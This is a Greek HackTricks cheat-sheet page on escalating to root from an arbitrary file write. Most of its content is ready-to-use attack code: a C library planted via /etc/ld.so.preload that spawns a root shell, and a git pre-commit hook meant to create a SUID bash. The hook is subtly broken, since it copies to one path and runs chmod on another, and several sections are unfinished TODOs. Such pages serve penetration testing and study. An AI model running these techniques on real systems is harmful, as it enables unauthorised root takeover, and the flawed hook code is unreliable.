# Αυθαίρετη Εγγραφή Αρχείου στο Root

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

### /etc/ld.so.preload

Αυτό το αρχείο συμπεριφέρεται όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`** αλλά λειτουργεί επίσης σε **SUID δυαδικά**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλά να προσθέσετε ένα **μονοπάτι προς μια βιβλιοθήκη που θα φορτωθεί** με κάθε εκτελούμενο δυαδικό.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Οι Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **σενάρια** που εκτελούνται σε διάφορα **συμβάντα** σε ένα αποθετήριο git όπως όταν δημιουργείται ένα commit, μια συγχώνευση... Έτσι, αν ένα **προνομιούχο σενάριο ή χρήστης** εκτελεί αυτές τις ενέργειες συχνά και είναι δυνατόν να **γράψει στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **ανύψωση προνομίων**.

Για παράδειγμα, είναι δυνατόν να **δημιουργηθεί ένα σενάριο** σε ένα αποθετήριο git στο **`.git/hooks`** ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Αρχεία Cron & Time

TODO

### Αρχεία Υπηρεσιών & Σοκέ

TODO

### binfmt\_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο δυαδικό αρχείο πρέπει να εκτελέσει ποιον τύπο αρχείων. TODO: ελέγξτε τις απαιτήσεις για να εκμεταλλευτείτε αυτό για να εκτελέσετε ένα αντίστροφο κέλυφος όταν ανοίγεται ένα κοινό τύπο αρχείου.
